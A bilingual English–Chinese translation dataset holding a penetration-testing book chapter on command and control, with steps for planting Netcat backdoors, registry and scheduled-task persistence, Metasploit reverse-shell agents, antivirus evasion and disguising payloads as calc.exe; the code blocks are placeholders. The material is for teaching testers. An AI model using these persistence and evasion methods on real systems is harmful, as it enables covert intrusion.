- en: '13'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Command and Control
  id: totrans-1
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Modern attackers are not interested in exploiting a system or network and then
    moving on. Instead, the goal is to attack and compromise a network of value and
    then remain resident on the network for as long as possible. **Command and control**
    (**C2**) refer to the mechanisms that testers use to replicate attacker actions
    by persisting on a system, maintaining two-way communication, enabling data to
    be exfiltrated to the tester’s location, and hiding the evidence of the attack.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
- en: In the command, control, and communication phase, the attacker relies on a persistent
    connection with the compromised system to ensure that they can continue to maintain
    their control.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
- en: 'In this chapter, you will learn about the following topics:'
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
- en: The importance of persistence
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Maintaining persistence with the PowerShell Empire, Covenant, PoshC2, and online
    file sharing
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Performing domain fronting techniques to maintain command and control
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The art of exfiltrating data using different protocols
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Hiding the evidence of an attack
  id: totrans-9
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Persistence
  id: totrans-10
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'To be effective, the attacker must be able to maintain **interactive persistence**;
    they must have a two-way communication channel with the exploited system (interactive)
    that remains on the compromised system for a long period of time without being
    discovered (persistence). This type of connectivity is a requirement for the following
    reasons:'
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
- en: Network intrusions may be detected, and the compromised systems may be identified
    and patched.
  id: totrans-12
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Some exploits only work once because the vulnerability is intermittent or because
    exploitation causes the system to fail or change, rendering the vulnerability
    unusable.
  id: totrans-13
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Attackers may need to return multiple times to the same target for various reasons.
  id: totrans-14
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The target’s usefulness is not always immediately known at the time it is compromised.
  id: totrans-15
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The tool used to maintain interactive persistence is usually referred to by
    classic terms such as **backdoor** or **rootkit**. However, the trend toward long-term
    persistence by both automated malware and human attacks has blurred the meaning
    of traditional labels, so instead, we will refer to malicious software that is
    intended to stay on the compromised system for an extended period as a **persistent
    agent**.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
- en: 'These persistent agents perform many functions for attackers and penetration
    testers, including the following:'
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
- en: Allowing additional tools to be uploaded to support new attacks, especially
    against systems located on the same network.
  id: totrans-18
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Facilitating the exfiltration of data from compromised systems and networks.
  id: totrans-19
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Allowing attackers to reconnect to a compromised system, usually via an encrypted
    channel to avoid detection. Persistent agents have been known to remain on systems
    for more than a year.
  id: totrans-20
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Employing anti-forensic techniques to avoid being detected, including hiding
    in the target’s filesystem or system memory, using strong authentication, and
    using encryption.
  id: totrans-21
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Using persistent agents
  id: totrans-22
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Traditionally, attackers would place a backdoor on a compromised system. If
    the front door provides authorized access to legitimate users, backdoor applications
    allow attackers to return to an exploited system and have access to services and
    data.
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 传统上，攻击者会在被攻陷的系统上放置一个后门。如果前门提供了合法用户的授权访问，后门应用程序则允许攻击者返回到被利用的系统并访问服务和数据。
- en: Unfortunately, classic backdoors provided limited interactivity and were not
    designed to be persistent on compromised systems for very long time frames. This
    was viewed as a significant shortcoming by the attacker community because once
    the backdoor was discovered and removed, there was additional work required to
    repeat the compromise steps and exploit the system, which was made even more difficult
    by forewarned system administrators defending the network and its resources.
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 不幸的是，经典的后门提供的交互性有限，并且并未设计为在被攻陷的系统上保持长时间的持久性。攻击者社区认为这是一个显著的缺点，因为一旦后门被发现并移除，就需要额外的工作来重复攻陷步骤并再次利用该系统，而这使得系统管理员提前防御网络和资源变得更加困难。
- en: Attackers now focus on persistent agents that are properly employed and are
    more difficult to detect. The first tool we will review is the venerable Netcat.
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，攻击者将重点放在正确使用并且更难检测的持久代理上。我们将首先回顾的工具是久经考验的 Netcat。
- en: Employing Netcat as a persistent agent
  id: totrans-26
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 将 Netcat 用作持久代理
- en: Netcat is an application that supports reading from, and writing to, network
    connections using raw TCP and UDP packets. Unlike packets that are organized by
    services such as Telnet or FTP, Netcat’s packets are not accompanied by headers
    or other channel information specific to the service. This simplifies communications
    and allows for an almost universal communication channel.
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: Netcat 是一个支持通过原始 TCP 和 UDP 包从网络连接中读取和写入数据的应用程序。与由 Telnet 或 FTP 等服务组织的包不同，Netcat
    的包不附带服务特定的头部或其他通道信息。这简化了通信并提供了几乎通用的通信通道。
- en: 'The last stable version of Netcat was released by Hobbit in 1996, and it has
    remained as useful as ever; in fact, it is frequently referred to as the **TCP/IP
    Swiss Army knife**. Netcat can perform many functions, including the following:'
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: Netcat 的最后一个稳定版本由 Hobbit 于 1996 年发布，并且至今仍然保持其高度的实用性；事实上，它常被称为**TCP/IP 瑞士军刀**。Netcat
    可以执行许多功能，包括以下内容：
- en: Port scanning
  id: totrans-29
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 端口扫描
- en: Banner grabbing to identify services
  id: totrans-30
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 横幅抓取以识别服务
- en: Port redirection and proxying
  id: totrans-31
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 端口重定向和代理
- en: File transfer and chatting, including support for data forensics and remote
    backups
  id: totrans-32
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 文件传输和聊天功能，包括数据取证和远程备份支持
- en: Create a backdoor or an interactive persistent agent on a compromised system
  id: totrans-33
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在被攻陷的系统上创建后门或交互式持久代理
- en: At this point, we will focus on using Netcat to create a persistent shell on
    a compromised system. Although the following example uses Windows as the target
    platform, it functions the same when used on a Unix-based platform. It should
    also be noted that most legacy Unix platforms include Netcat as part of the operating
    system.
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 在这一部分，我们将重点介绍如何使用 Netcat 在被攻击的系统上创建一个持久化的 shell。尽管以下示例使用 Windows 作为目标平台，但在基于
    Unix 的平台上使用时，它的功能是相同的。还应该注意的是，大多数旧版 Unix 平台将 Netcat 作为操作系统的一部分。
- en: 'In the example shown in *Figure 13.1*, we will retain the executable’s name,
    `nc.exe`; however, it is common to rename it prior to use to minimize detection.
    Even if it is renamed, it will usually be identified by antivirus software; many
    attackers will alter or remove elements of Netcat’s source code that are not required
    and recompile it prior to use. Such changes can alter the specific signature that
    antivirus programs use to identify the application as Netcat, making it invisible
    to antivirus programs:'
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 在*图 13.1*所示的示例中，我们将保留可执行文件的名称 `nc.exe`；然而，在使用之前通常会将其重命名以减少被检测的风险。即使重命名，它通常也会被杀毒软件识别；许多攻击者会修改或删除
    Netcat 源代码中不需要的部分，并在使用前重新编译。这样的修改可以改变杀毒软件用来识别 Netcat 应用程序的特定签名，使其对杀毒软件来说不可见：
- en: 'Netcat is stored on Kali in the `/usr/share/windows-binaries` repository. To
    upload it to a compromised system, enter the following command from within Meterpreter:'
  id: totrans-36
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Netcat 存储在 Kali 的 `/usr/share/windows-binaries` 仓库中。要将其上传到被攻陷的系统，可以在 Meterpreter
    中输入以下命令：
- en: '[PRE0]'
  id: totrans-37
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE0]'
- en: 'The execution of the previous command is shown in *Figure 13.1*:'
  id: totrans-38
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 执行前述命令的过程如*图 13.1*所示：
- en: '![](../Images/B17765_13_01.png)'
  id: totrans-39
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_01.png)'
- en: 'Figure 13.1: Uploading Netcat to the target'
  id: totrans-40
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.1：将 Netcat 上传到目标
- en: You do not have to place it in the `system32` folder specifically; however,
    due to the number and diversity of file types in this folder, this is the best
    location for hiding a file in a compromised system.
  id: totrans-41
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 你不必专门将其放置在`system32`文件夹中；然而，由于该文件夹中包含大量文件和多种类型文件，这是在被攻陷系统中隐藏文件的最佳位置。
- en: While conducting a penetration test on one client, we identified six separate
    instances of Netcat on one server. Netcat had been installed twice by two separate
    system administrators to support network management; the other four instances
    were installed by external attackers and were not identified until the penetration
    test. Therefore, always look to see whether or not Netcat is already installed
    on your target!
  id: totrans-42
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在对一个客户进行渗透测试时，我们发现一台服务器上存在六个独立的Netcat实例。两名系统管理员分别安装了Netcat两次以支持网络管理；另外四个实例是外部攻击者安装的，在渗透测试之前未被发现。因此，务必检查目标系统中是否已经安装了Netcat！
- en: If you do not have a Meterpreter connection, you can use **Trivial File Transfer
    Protocol** (**TFTP**) to transfer the file.
  id: totrans-43
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果没有Meterpreter连接，可以使用**简单文件传输协议**（**TFTP**）传输文件。
- en: 'Next, configure the registry to launch Netcat when the system starts up, and
    ensure that it is listening on port `8888` (or any other port that you have selected,
    as long as it is not in use) using the following command:'
  id: totrans-44
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，配置注册表以便在系统启动时启动Netcat，并确保它监听`8888`端口（或任何其他未被占用的端口），使用以下命令：
- en: '[PRE1]'
  id: totrans-45
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'Confirm that the change in the registry was successfully implemented using
    the following `queryval` command:'
  id: totrans-46
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用以下`queryval`命令确认注册表中的更改是否成功实施：
- en: '[PRE2]'
  id: totrans-47
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE2]'
- en: Using the `netsh` command, open a port on the local firewall to ensure that
    the compromised system will accept remote connections to Netcat. It is important
    to know the target’s operating system. The `netsh advfirewall firewall` command-line
    context is used for Windows 10, Windows Server 2008, and later versions; the `netsh
    firewall` command is used for earlier operating systems.
  id: totrans-48
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用`netsh`命令，在本地防火墙上打开端口，确保被攻陷的系统能够接受来自Netcat的远程连接。了解目标的操作系统至关重要。`netsh advfirewall
    firewall`命令行上下文适用于Windows 10、Windows Server 2008及之后版本；`netsh firewall`命令适用于早期版本操作系统。
- en: To add a port to the local Windows firewall, enter the `shell` command at the
    Meterpreter prompt and then enter `rule` using the appropriate command. When naming
    the `rule`, use a name such as `svchostpassthrough` that suggests that `rule`
    is important for the proper functioning of the system.
  id: totrans-49
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要将端口添加到本地Windows防火墙，请在Meterpreter提示符下输入`shell`命令，然后使用适当的命令输入`rule`。命名`rule`时，可以使用类似`svchostpassthrough`的名称，表示此`rule`对系统的正常运行非常重要。
- en: 'A sample command is shown as follows:'
  id: totrans-50
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 示例命令如下所示：
- en: '[PRE3]'
  id: totrans-51
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'Confirm that the change was successfully implemented using the following command:'
  id: totrans-52
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用以下命令确认更改是否成功实施：
- en: '[PRE4]'
  id: totrans-53
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'The execution of the previously mentioned commands is shown in *Figure 13.2*:'
  id: totrans-54
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 执行前述命令的过程如*图13.2*所示：
- en: '![](../Images/B17765_13_02.png)'
  id: totrans-55
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_02.png)'
- en: 'Figure 13.2: Adding a firewall rule to allow the custom port'
  id: totrans-56
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图13.2：添加防火墙规则以允许自定义端口
- en: 'When the port rule is confirmed, ensure that the reboot option works, as follows:'
  id: totrans-57
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 确认端口规则后，确保重启选项正常工作，如下所示：
- en: 'Enter the following command from the Meterpreter prompt:'
  id: totrans-58
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 从Meterpreter提示符输入以下命令：
- en: '[PRE5]'
  id: totrans-59
  prefs:
  - PREF_IND
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'Enter the following command from an interactive Windows shell:'
  id: totrans-60
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 从交互式Windows shell输入以下命令：
- en: '[PRE6]'
  id: totrans-61
  prefs:
  - PREF_IND
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE6]'
- en: To remotely access the compromised system, type `nc` at the terminal, indicate
    the verbosity of the connection (`-v` reports basic information and `-vv` reports
    much more information), and then enter the IP address of the target and the port
    number, as shown in *Figure 13.3*:![](../Images/B17765_13_03.png)
  id: totrans-62
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要远程访问被攻陷的系统，请在终端输入`nc`，指定连接的详细程度（`-v`报告基本信息，`-vv`报告更多信息），然后输入目标的IP地址和端口号，如*图13.3*所示：![](../Images/B17765_13_03.png)
- en: 'Figure 13.3: Successfully connecting to the persistent backdoor through Netcat'
  id: totrans-63
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图13.3：通过Netcat成功连接到持久后门
- en: Unfortunately, there are some limitations to using Netcat. There is no authentication
    or encryption of transmitted data, and it is detected by nearly all antivirus
    software.
  id: totrans-64
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 不幸的是，使用Netcat存在一些局限性。传输的数据没有认证或加密，而且几乎所有的防病毒软件都会检测到它。
- en: The lack of encryption can be resolved using `cryptcat`, a Netcat variant that
    uses Twofish encryption to secure data during transmission between the exploited
    host and the attacker. Twofish encryption, developed by Bruce Schneider, is an
    advanced symmetric block cipher that provides reasonably strong protection for
    encrypted data.
  id: totrans-65
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 可以使用`cryptcat`解决缺乏加密的问题，它是Netcat的一个变体，使用Twofish加密来保护在受害主机与攻击者之间传输的数据。Twofish加密是由Bruce
    Schneider开发的高级对称块密码，它为加密数据提供了合理强大的保护。
- en: 'To use `cryptcat`, ensure that there is a listener ready and configured with
    a strong password using the following command:'
  id: totrans-66
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 要使用`cryptcat`，请确保有一个监听器已准备好，并且已使用以下命令配置了一个强密码：
- en: '[PRE7]'
  id: totrans-67
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'Next, upload `cryptcat` (based on the target operating system; if it’s Windows,
    upload a Windows binary that is available in [https://github.com/pprugger/Cryptcat-1.3.0-Win-10-Release](https://github.com/pprugger/Cryptcat-1.3.0-Win-10-Release))
    to the compromised system and configure it to connect with the listener’s IP address
    using the following command:'
  id: totrans-68
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，根据目标操作系统上传`cryptcat`（如果是Windows，则上传可在[https://github.com/pprugger/Cryptcat-1.3.0-Win-10-Release](https://github.com/pprugger/Cryptcat-1.3.0-Win-10-Release)获取的Windows二进制文件）到被攻陷系统，并使用以下命令配置它连接到监听器的IP地址：
- en: '[PRE8]'
  id: totrans-69
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE8]'
- en: Unfortunately, Netcat and its variants remain detectable by most antivirus applications.
    However, in case the target is a Linux system, this utility is preinstalled and
    pen testers can leverage them to open a port and run the backdoor. It is possible
    to render Netcat undetectable using a hex editor to alter the source code of Netcat.
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 不幸的是，Netcat及其变体仍然能被大多数防病毒应用程序检测到。然而，如果目标是Linux系统，该工具会预先安装，渗透测试人员可以利用它们打开端口并运行后门。通过使用十六进制编辑器修改Netcat的源代码，可以使Netcat变得不可检测。
- en: This will help avoid triggering the signature matching action of the antivirus,
    but this can be a long trial-and-error process. A more efficient approach is to
    take advantage of Empire’s persistence mechanisms.
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 这将有助于避免触发防病毒程序的签名匹配动作，但这可能是一个漫长的试错过程。更有效的方法是利用Empire的持久性机制。
- en: Using schtasks to configure a persistent task
  id: totrans-72
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用schtasks配置持久任务
- en: The **Windows Task Scheduler** (`schtasks`) was introduced as a replacement
    for `at.exe` in Windows XP and 2003\. However, `at.exe` is obsolete in the latest
    versions of Windows. In this section, we will use scheduled tasks to maintain
    persistent access to a compromised system.
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: '**Windows任务计划程序** (`schtasks`) 是在Windows XP和2003中作为`at.exe`的替代品引入的。然而，`at.exe`在最新版本的Windows中已被废弃。在本节中，我们将使用计划任务来维持对被攻陷系统的持久访问。'
- en: 'Attackers can create a scheduled task on the compromised system to run the
    Empire agent payload from the attacker’s machine, and then provide backdoor access.
    `schtasks` can be scheduled directly from the command prompt, as shown in *Figure
    13.4*:'
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者可以在被攻陷的系统上创建一个计划任务，从攻击者的机器运行Empire代理有效载荷，并提供后门访问。`schtasks`可以直接从命令提示符中安排，如*图13.4*所示：
- en: '![](../Images/B17765_13_04.png)Figure 13.4: Creating schedule tasks on the
    target for persistence'
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: '![](../Images/B17765_13_04.png)图13.4：在目标上创建计划任务以保持持久性'
- en: 'The following are the typical scheduled tasks scenarios that can be engaged
    by attackers to maintain persistent access to the system:'
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是攻击者可以利用的典型计划任务场景，用于保持对系统的持久访问：
- en: 'To launch an Empire PowerShell agent during the user login process, run the
    following command from the command line:'
  id: totrans-77
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 要在用户登录过程中启动Empire PowerShell代理，请从命令行运行以下命令：
- en: '[PRE9]'
  id: totrans-78
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE9]'
- en: 'Similarly, to launch the agent when starting the system, run the following
    command:'
  id: totrans-79
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 同样，为了在系统启动时启动代理，运行以下命令：
- en: '[PRE10]'
  id: totrans-80
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE10]'
- en: 'The following command will set up to launch an agent when the system becomes
    idle:'
  id: totrans-81
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 以下命令将在系统空闲时设置启动代理：
- en: '[PRE11]'
  id: totrans-82
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE11]'
- en: Attackers will ensure that the listener is always running and open for connection.
    To legitimize it on the network, the server would need to be set up with a valid
    SSL certificate running HTTPS in order not to trigger alerts in the internal security
    features (the firewall, IPS, or proxy).
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者将确保监听器始终运行并保持连接开放。为了使其在网络中合法化，服务器需要配置一个有效的SSL证书并运行HTTPS，以避免触发内部安全功能（如防火墙、IPS或代理）的警报。
- en: 'The same task can be performed by a single-line command using the PowerShell
    Empire tools module `persistence/elevated/schtasks`, as shown in *Figure 13.5*:'
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 使用PowerShell Empire工具模块`persistence/elevated/schtasks`，攻击者可以通过单行命令执行相同的任务，如*图13.5*所示：
- en: '![](../Images/B17765_13_05.png)'
  id: totrans-85
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_05.png)'
- en: 'Figure 13.5: Creating schedule tasks on the target for persistence'
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 图13.5：在目标上创建计划任务以保持持久性
- en: Now that we have learned how to utilize the scheduled task to maintain persistence
    to the target, we will explore the Metasploit post exploit module.
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经学会了如何利用计划任务来保持对目标的持久性，接下来我们将探讨Metasploit的后期利用模块。
- en: Maintaining persistence with the Metasploit framework
  id: totrans-88
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用Metasploit框架维持持久性
- en: Metasploit’s Meterpreter contains several scripts that support persistence on
    a compromised system. We will examine the post exploit module for placing a backdoor.
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit的Meterpreter包含多个支持在被攻破系统上保持持久性的脚本。我们将研究用于植入后门的后期利用模块。
- en: Using the post exploit persistence module
  id: totrans-90
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用后期利用持久化模块
- en: After a system has been exploited and the `migrate` command has moved the initial
    shell to a more secure service, an attacker can invoke the `windows/manage/persistence_exe`
    script from the Meterpreter prompt.
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 在系统被利用并且`migrate`命令将初始Shell转移到更安全的服务后，攻击者可以从Meterpreter提示符下调用`windows/manage/persistence_exe`脚本。
- en: In the example shown in *Figure 13.6*, we could elect to use the `REXENAME`
    `and` `REXEPATH` options, which will start persistence when a user logs in to
    the target system.
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 在*图13.6*所示的示例中，我们可以选择使用`REXENAME`和`REXEPATH`选项，这将在用户登录目标系统时启动持久化。
- en: Successful implanting of the backdoor will run automatically when the system
    boots to execute the file that we have set, with a specific IP address and port.
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 成功植入后门后，系统启动时将自动运行，执行我们设置的文件，并使用特定的IP地址和端口。
- en: '![](../Images/B17765_13_06.png)Figure 13.6: Placing a backdoor using Metasploit’s
    post exploit module for persistence'
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: '![](../Images/B17765_13_06.png)图13.6：使用Metasploit的后期利用模块进行持久化植入后门'
- en: Note that we have arbitrarily selected a port for use by `persistence`; an attacker
    must verify the local firewall settings to ensure that this port is open or use
    the `reg` command to open the port. As with most Metasploit modules, any port
    can be selected as long as it is not already in use.
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意，我们已经任意选择了一个端口供`persistence`使用；攻击者必须验证本地防火墙设置，确保该端口已开放，或者使用`reg`命令打开该端口。与大多数Metasploit模块一样，只要端口未被占用，任何端口都可以被选择。
- en: 'The post exploit module’s `persistence_exe` script places an executable file
    in a temporary directory. The script also adds that file to the local autorun
    sections of the registry. Because the post exploit module, `persistence_exe`,
    is not authenticated and anyone can use it to access the compromised system, it
    should be removed from the system as soon as possible after the discovery or completion
    of penetration testing. To remove the script, confirm the location of the resource
    file for cleanup, and then execute the following resource command:'
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 后期利用模块的`persistence_exe`脚本将在临时目录中放置一个可执行文件。该脚本还将该文件添加到注册表的本地自动运行部分。由于后期利用模块`persistence_exe`没有认证，任何人都可以利用它访问被攻破的系统，因此在发现或渗透测试完成后，应该尽快将其从系统中移除。要移除该脚本，请确认资源文件的位置以便清理，然后执行以下资源命令：
- en: '[PRE12]'
  id: totrans-97
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: Creating a standalone persistent agent with Metasploit
  id: totrans-98
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用Metasploit创建独立持久性代理
- en: 'The Metasploit framework can be used to create a standalone executable that
    can persist on a compromised system and allow interactive communications. The
    advantage of a standalone package is that it can be prepared and tested in advance
    to ensure connectivity, and encoded to bypass local antivirus software:'
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit框架可以用来创建一个独立的可执行文件，使其能够在被攻破的系统上持久存在，并允许交互式通信。独立包的优势在于，它可以提前准备和测试，以确保连接性，并进行编码以绕过本地的杀毒软件：
- en: 'To make a simple standalone agent, use `msfvenom`. In the example shown in
    *Figure 13.7*, the agent is configured to use a `reverse_tcp` shell that will
    connect to the localhost at the attacker’s IP on port `443`:'
  id: totrans-100
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要制作一个简单的独立代理，可以使用`msfvenom`。在*图13.7*所示的示例中，代理配置为使用`reverse_tcp`外壳，将连接到攻击者IP的本地主机端口`443`：
- en: '[PRE13]'
  id: totrans-101
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE13]'
- en: 'The agent, named `attack.exe`, will use a Win32 executable template:'
  id: totrans-102
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 名为`attack.exe`的代理将使用一个Win32可执行模板：
- en: '![](../Images/B17765_13_07.png)'
  id: totrans-103
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_07.png)'
- en: 'Figure 13.7: Creating a backdoor exploit to connect back to the Kali Linux
    on a specific port'
  id: totrans-104
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图13.7：创建一个后门利用程序，通过特定端口连接回Kali Linux
- en: This encodes the `attack1.exe` agent five times using the `x86/shikata_ga_nai`
    encoder. Each time it is re-encoded, it becomes more difficult to detect. However,
    the executable also increases in size.
  id: totrans-105
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 该文件使用`x86/shikata_ga_nai`编码器对`attack1.exe`代理进行五次编码。每次重新编码后，检测变得更加困难。然而，可执行文件的大小也会增加。
- en: 'We can configure the encoding pattern in `msfvenom` by using `-b x64/other`
    to avoid certain characters. For example, the following characters should be avoided
    when encoding a persistent agent because they may result in the discovery and
    failure of the attack:'
  id: totrans-106
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们可以通过使用`-b x64/other`在`msfvenom`中配置编码模式，以避免特定字符。例如，在编码持久性代理时应避免以下字符，因为它们可能导致攻击被发现和失败：
- en: '`\x00`: Represents a 0-byte address'
  id: totrans-107
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`\x00`：表示0字节地址'
- en: '`\xa0`: Represents a line feed'
  id: totrans-108
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`\xa0`：表示换行'
- en: '`\xad`: Represents a carriage return'
  id: totrans-109
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`\xad`：表示换行符'
- en: 'To create a multi-encoded payload, use the following command:'
  id: totrans-110
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要创建多重编码的有效负载，请使用以下命令：
- en: '[PRE14]'
  id: totrans-111
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE14]'
- en: You can also encode `msfvenom` to an existing executable, and both the modified
    executable and the persistent agent will function. To bind the persistent agent
    to an executable such as a calculator (`calc.exe`), first, copy the appropriate
    `calc.exe` file into Kali Linux. You can download it from your existing session
    using Meterpreter by running `meterpreter > download c:\\windows\\system32\\calc.exe`.
  id: totrans-112
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 你还可以将`msfvenom`编码到现有的可执行文件中，修改后的可执行文件和持久性代理都将正常工作。要将持久性代理绑定到可执行文件（如计算器`calc.exe`），首先在Kali
    Linux中复制适当的`calc.exe`文件。你可以通过Meterpreter从现有会话中下载它，运行`meterpreter > download c:\\windows\\system32\\calc.exe`。
- en: 'When the file is downloaded, run the following command:'
  id: totrans-113
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下载文件后，运行以下命令：
- en: '[PRE15]'
  id: totrans-114
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE15]'
- en: The agent can be placed on the target system, renamed `calc.exe` (to replace
    the original calculator if access is denied, place the file on the desktop), and
    then executed.
  id: totrans-115
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 可以将代理放置在目标系统上，并重命名为`calc.exe`（如果访问被拒绝，可以将文件放在桌面上），然后执行。
- en: Unfortunately, nearly all Metasploit-encoded executables can be detected by
    client antivirus or EDR software. This has been attributed to penetration testers
    who have submitted encrypted payloads to sites such as VirusTotal ([www.virustotal.com](http://www.virustotal.com)).
    However, you can create an executable and then encrypt it using Veil-Evasion,
    as described in *Chapter 10*, *Exploitation*.
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
